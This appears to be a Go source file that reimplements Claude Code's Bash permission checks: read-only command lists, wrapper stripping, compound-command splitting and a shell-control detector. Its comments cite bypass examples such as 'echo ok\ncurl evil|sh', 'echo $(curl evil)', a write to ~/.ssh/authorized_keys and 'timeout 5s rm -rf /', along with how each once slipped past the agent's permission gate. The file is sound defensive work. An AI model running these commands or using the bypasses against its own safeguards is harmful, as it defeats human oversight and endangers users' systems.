package permissions

import (
	"strings"
)

// readOnlyBuiltins are commands Claude Code auto-allows without prompting or
// consulting settings.json. These are the "always safe" reads that would
// otherwise generate an absurd amount of permission noise. Matched by the
// first token (post-wrapper-stripping) OR by the first two tokens for git
// subcommands.
//
// This list is intentionally conservative — it's what Claude Code itself
// treats as read-only in its default configuration. Anything not on this
// list falls through to the settings-driven rules.
//
// Membership here is decided on the head token alone, so a command may only
// appear on this list if NO invocation of it can run another program or
// write a file through its own arguments. That is why `env` and `find` are
// deliberately absent: `env CMD…` execs CMD, and `find … -exec CMD \;` /
// `-delete` do the same (and worse). Both would have handed an attacker
// arbitrary execution behind a head token the gate calls "read-only".
// Do not re-add them.
var readOnlyBuiltins = map[string]bool{
	"ls":    true,
	"cat":   true,
	"echo":  true,
	"pwd":   true,
	"head":  true,
	"tail":  true,
	"grep":  true,
	"wc":    true,
	"which": true,
	"diff":  true,
	"stat":  true,
	"du":    true,
	"cd":    true,
	"file":  true,
	"date":  true,
	"true":  true,
	"false": true,
	"test":  true,
	"[":     true,
}

// readOnlyGitSubcommands are the git verbs Claude Code treats as read-only.
// Anything else under git (add, commit, push, checkout, reset, rebase, …)
// falls through to the settings rules.
var readOnlyGitSubcommands = map[string]bool{
	"status":   true,
	"log":      true,
	"diff":     true,
	"show":     true,
	"blame":    true,
	"branch":   true,
	"tag":      true,
	"describe": true,
	"config":   true, // read-only when no --set/--add; conservative here — Claude allows it
	"remote":   true, // ditto — bare `git remote` is a list
	"rev-parse": true,
	"ls-files": true,
	"ls-tree":  true,
	"cat-file": true,
	"reflog":   true,
	"stash":    true, // `git stash list` etc.; write forms exist but common usage is read
	"shortlog": true,
	"whatchanged": true,
	"grep":     true,
}

// processWrappers are prefix commands that just delegate to their remaining
// arguments. Claude Code strips these before rule evaluation so
// `timeout 30 npm test` matches `Bash(npm test)`.
//
// Note we do NOT strip environment-runners like `direnv exec`, `devbox run`,
// `npx`, `docker exec`, `env FOO=bar cmd` — those are not on Claude Code's
// wrapper list. They change the resolution semantics enough that treating
// them as transparent would be unsafe.
//
// `xargs` stays on the list even though it, like `env`, runs a program named
// by its arguments. The difference is direction: stripping a wrapper makes
// the evaluator look at the INNER command, so `… | xargs rm -rf` is judged as
// `rm -rf` and trips the Article 13 ask. Dropping xargs here would hide that
// from every argument-bearing deny rule, which is strictly worse. What xargs
// cannot do is earn an auto-allow it wouldn't otherwise get: the read-only
// list ignores arguments anyway, so `… | xargs cat` grants no more than
// `cat` does. The residual gap — args arriving on stdin are invisible to
// pattern rules — is inherent to xargs and not fixable by classification.
var processWrappers = map[string]bool{
	"timeout": true,
	"time":    true,
	"nice":    true,
	"nohup":   true,
	"stdbuf":  true,
	"xargs":   true, // bare `xargs cmd` — options are dropped by stripWrappers
	"ionice":  true,
	"chrt":    true,
	"unbuffer": true,
}

// compoundOperators are the shell operators that chain independent commands.
// The permission model treats every subcommand as separately gated — the
// compound is allowed only if EVERY subcommand is allowed.
//
// Newline and carriage return are on this list because a newline separates
// commands in shell exactly as `;` does. Omitting them let a whole second
// command ride along behind an innocent first line ("echo ok\ncurl evil|sh")
// and be judged solely by that first line's head token.
var compoundOperators = []string{"&&", "||", "|&", ";", "|", "&", "\n", "\r"}

// SplitCompound splits a shell command line into its independent subcommands
// on the compound operators. Quoting is respected so `echo "a && b"` stays
// one subcommand. Backslash-escapes are honored inside double quotes for the
// common `\"` case; more exotic escape handling is deliberately skipped —
// the goal is match Claude Code's own splitter, which is likewise pragmatic.
func SplitCompound(cmd string) []string {
	var parts []string
	var buf strings.Builder
	i := 0
	n := len(cmd)
	inSingle := false
	inDouble := false
	for i < n {
		c := cmd[i]
		if !inSingle && !inDouble {
			// Try each operator at this position.
			matched := ""
			for _, op := range compoundOperators {
				if strings.HasPrefix(cmd[i:], op) {
					if len(op) > len(matched) {
						matched = op
					}
				}
			}
			if matched != "" {
				parts = append(parts, strings.TrimSpace(buf.String()))
				buf.Reset()
				i += len(matched)
				continue
			}
		}
		switch c {
		case '\'':
			if !inDouble {
				inSingle = !inSingle
			}
		case '"':
			if !inSingle {
				inDouble = !inDouble
			}
		case '\\':
			// A backslash immediately before a newline is a line continuation:
			// the shell splices the lines into ONE command, so we drop both
			// bytes rather than let the newline split here.
			if !inSingle && i+1 < n && (cmd[i+1] == '\n' || cmd[i+1] == '\r') {
				i += 2
				if i < n && cmd[i] == '\n' && cmd[i-1] == '\r' {
					i++ // CRLF
				}
				continue
			}
			// Preserve the next char verbatim inside double quotes / unquoted.
			if !inSingle && i+1 < n {
				buf.WriteByte(c)
				buf.WriteByte(cmd[i+1])
				i += 2
				continue
			}
		case '$':
			// $(...) — treat as opaque; skip past matching paren so operators
			// inside a subshell don't split us. Nested handling is best-effort.
			if !inSingle && i+1 < n && cmd[i+1] == '(' {
				buf.WriteByte(c)
				buf.WriteByte('(')
				depth := 1
				i += 2
				for i < n && depth > 0 {
					if cmd[i] == '(' {
						depth++
					}
					if cmd[i] == ')' {
						depth--
					}
					buf.WriteByte(cmd[i])
					i++
				}
				continue
			}
		}
		buf.WriteByte(c)
		i++
	}
	if s := strings.TrimSpace(buf.String()); s != "" {
		parts = append(parts, s)
	}
	// Filter empties.
	out := parts[:0]
	for _, p := range parts {
		if p != "" {
			out = append(out, p)
		}
	}
	return out
}

// stripWrappers peels off process-wrapper prefixes. `timeout 30 npm test`
// becomes `npm test`; `nice -n 10 pytest` becomes `pytest`. Numeric args and
// short flags after a wrapper are consumed heuristically — enough to handle
// the common cases without needing a full arg parser per wrapper.
//
// The strip runs iteratively: `time timeout 30 make test` → `timeout 30 make
// test` → `make test`. That way stacked wrappers don't need bespoke handling.
func stripWrappers(cmd string) string {
	for {
		tokens := shellSplit(cmd)
		if len(tokens) == 0 {
			return cmd
		}
		head := tokens[0]
		if !processWrappers[head] {
			return cmd
		}
		// Consume trailing flag/numeric args on the wrapper. Options like
		// `-n 10` and bare numeric args like `timeout 30` all get eaten.
		rest := tokens[1:]
		for len(rest) > 0 && looksLikeWrapperArg(rest[0]) {
			// Some flags take a value (`-n 10`); heuristic: if the flag
			// doesn't include `=` and the next token is numeric, eat it too.
			flag := rest[0]
			rest = rest[1:]
			if strings.HasPrefix(flag, "-") && !strings.Contains(flag, "=") &&
				len(rest) > 0 && isWrapperValue(rest[0]) {
				rest = rest[1:]
			}
		}
		if len(rest) == 0 {
			return cmd
		}
		next := strings.Join(rest, " ")
		if next == cmd {
			return cmd
		}
		cmd = next
	}
}

func looksLikeWrapperArg(tok string) bool {
	if tok == "" {
		return false
	}
	if strings.HasPrefix(tok, "-") {
		return true
	}
	return isWrapperValue(tok)
}

// isWrapperValue reports whether a token looks like a value a wrapper takes
// rather than the start of the real command — a bare number (`timeout 30`)
// or a number with a unit suffix (`timeout 5s`, `timeout -k 1.5m`).
//
// Durations matter for more than tidiness: before they were recognized,
// `timeout 5s rm -rf /` stripped to `5s rm -rf /`, whose head token is `5s`.
// That is not `rm …`, so every `Bash(rm -rf*)` deny/ask rule sailed past it —
// the same "rules judge a spelling, not the command" failure as H4.
func isWrapperValue(s string) bool {
	if isNumeric(s) {
		return true
	}
	for _, unit := range []string{"ns", "us", "ms", "s", "m", "h", "d"} {
		if num := strings.TrimSuffix(s, unit); num != s && isNumeric(num) {
			return true
		}
	}
	return false
}

func isNumeric(s string) bool {
	if s == "" {
		return false
	}
	for _, r := range s {
		if (r < '0' || r > '9') && r != '.' {
			return false
		}
	}
	return true
}

// shellSplit is a minimal token split that respects single and double quotes.
// It's not a full shell parser; it just needs to find command boundaries and
// the first token or two for readOnly / wrapper checks.
func shellSplit(s string) []string {
	var out []string
	var buf strings.Builder
	inSingle, inDouble := false, false
	flush := func() {
		if buf.Len() > 0 {
			out = append(out, buf.String())
			buf.Reset()
		}
	}
	for i := 0; i < len(s); i++ {
		c := s[i]
		switch {
		case c == '\'' && !inDouble:
			inSingle = !inSingle
		case c == '"' && !inSingle:
			inDouble = !inDouble
		case c == ' ' && !inSingle && !inDouble:
			flush()
		default:
			buf.WriteByte(c)
		}
	}
	flush()
	return out
}

// hasShellControl reports whether cmd contains, OUTSIDE of quotes, anything
// that makes it more than "one program run with its arguments": redirection
// (`>`, `>>`, `<`, `<<`, `>&`, `&>`), command substitution (`$(…)`, backticks),
// process substitution (`<(…)`, `>(…)` — subsumed by the `<`/`>` test), a
// newline, or a chaining operator that somehow survived SplitCompound.
//
// This is the guard on the head-token auto-allow. `cat` reads a file, but
// `cat notes > ~/.ssh/authorized_keys` writes one, and `echo $(curl evil)`
// executes one — all three have the same head token, so the head token alone
// cannot be the thing we decide on.
//
// Quoting is respected in both directions: `echo "a > b"` and `grep '$(x)' f`
// are ordinary arguments and stay auto-allowed, while `$(…)` and backticks
// still count inside double quotes because the shell expands them there. An
// unbalanced quote means we could not read the line the way the shell will,
// so it counts as control — the conservative answer for something the shell
// would reject anyway.
func hasShellControl(cmd string) bool {
	inSingle, inDouble := false, false
	for i := 0; i < len(cmd); i++ {
		c := cmd[i]
		switch {
		case c == '\\' && !inSingle:
			i++ // whatever follows is literal, including a `>` or a newline
			continue
		case c == '\'' && !inDouble:
			inSingle = !inSingle
			continue
		case c == '"' && !inSingle:
			inDouble = !inDouble
			continue
		}
		if inSingle {
			continue
		}
		// Expansions the shell performs inside double quotes too.
		if c == '`' || (c == '$' && i+1 < len(cmd) && cmd[i+1] == '(') {
			return true
		}
		if inDouble {
			continue
		}
		switch c {
		case '>', '<', '\n', '\r', ';', '|', '&':
			return true
		}
	}
	return inSingle || inDouble
}

// isReadOnlyBuiltin reports whether the (post-strip) command is one Claude
// Code considers safe without any settings-rule consultation. Returns
// (true, reason) with a human-readable reason on match.
//
// The head-token lookup only applies to a genuinely simple command; anything
// carrying redirection, substitution or an embedded newline falls through to
// the settings rules (i.e. ask, absent a rule that says otherwise) instead of
// being waved through on the strength of its first word.
func isReadOnlyBuiltin(cmd string) (bool, string) {
	if hasShellControl(cmd) {
		return false, ""
	}
	tokens := shellSplit(cmd)
	if len(tokens) == 0 {
		return false, ""
	}
	head := tokens[0]
	if readOnlyBuiltins[head] {
		return true, "read-only builtin: " + head
	}
	if head == "git" && len(tokens) >= 2 {
		sub := tokens[1]
		if readOnlyGitSubcommands[sub] {
			return true, "read-only git: git " + sub
		}
	}
	return false, ""
}

// prepareBashCommand strips process wrappers and returns the (possibly
// modified) command line ready for rule matching.
func prepareBashCommand(cmd string) string {
	return strings.TrimSpace(stripWrappers(strings.TrimSpace(cmd)))
}
